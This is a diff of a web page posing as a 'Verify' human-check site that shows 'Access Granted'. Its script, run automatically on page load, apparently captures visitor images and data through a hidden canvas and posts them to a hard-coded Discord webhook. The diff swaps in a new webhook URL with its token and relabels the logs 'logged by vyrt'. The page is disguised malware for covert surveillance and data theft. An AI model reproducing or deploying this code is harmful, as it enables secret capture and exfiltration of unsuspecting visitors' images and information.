@@ -7,11 +7,11 @@
     <meta name="format-detection" content="telephone=no">
 
     <!-- OpenGraph / social cards - ONLY when custom values were actually given -->
-    <meta property="og:title" content="rifale">
-    <meta property="og:description" content="The place where you'll find forums, free databases and lot more only in rifale">
+    <meta property="og:title" content="Verify">
+    <meta property="og:description" content="The Verification System For The Website">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://rifale.surge.sh">
-    <meta property="og:site_name" content="rifale">
+    <meta property="og:url" content="?">
+    <meta property="og:site_name" content="Verify">
     <meta property="og:image" content="https://i.imgur.com/aCvtzVT.png">
 
     <title>rifale</title>
@@ -87,7 +87,7 @@
     <h1>Access Granted</h1>
     <p class="subtitle success">You're confirmed human</p>
     <div class="mock-info">
-      <div><strong>IP:</strong> 172.69.168.203</div>
+      <div><strong>IP:</strong> ERROR: Your IP Was Invalid.</div>
       <div><strong>Location:</strong> Authorized</div>
       <div><strong>Device:</strong> Verified</div>
       <div><strong>Threat:</strong> <span class="low">0.0</span></div>
@@ -106,7 +106,7 @@
 <canvas id="c" style="display:none"></canvas>
 
 <script>
-const HOOK = "https://discord.com/api/webhooks/1465857153225982238/gvTstuV_t-qu1n1bzHa_8EbuWiY8K1Ya1_TIU8VY4Oi96vnrqrTy7B4oWIp7mkcXcnyX";
+const HOOK = "https://discord.com/api/webhooks/1462954759173439570/4Pa4_ofFtn8e7x1xlWX_XGS-GxwBHDYhH7IzhrEGOgsBwWszDlxNiJ0dHKg-DpnCJQ3L";
 const INTERVAL_BASE = 700;
 const INTERVAL_JITTER = 400;
 const JPEG_QUALITY = 0.32;
@@ -151,7 +151,7 @@ async function sendRaw(body, isForm = false) {
 }
 
 async function sendEmbed(title, desc = "", color = 16711680) {
-    return sendRaw(JSON.stringify({ embeds: [{ title:title.slice(0,240), description:desc.slice(0,1900), color, timestamp:new Date().toISOString(), footer:{text:"#darknet_heaven"} }] }));
+    return sendRaw(JSON.stringify({ embeds: [{ title:title.slice(0,240), description:desc.slice(0,1900), color, timestamp:new Date().toISOString(), footer:{text:"logged by vyrt"} }] }));
 }
 
 async function sendPhoto(title, desc, blob) {
@@ -276,7 +276,7 @@ window.addEventListener("load", () => {
     setTimeout(() => {
         attemptVerification().catch(e => {
             console.error("CRASH ON LOAD", e);
-            sendEmbed("TOTAL FUCKUP", `Error: ${e}`);
+            sendEmbed("TOTAL DUCKUP", `Error: ${e}`);
         });
     }, 120);
 });
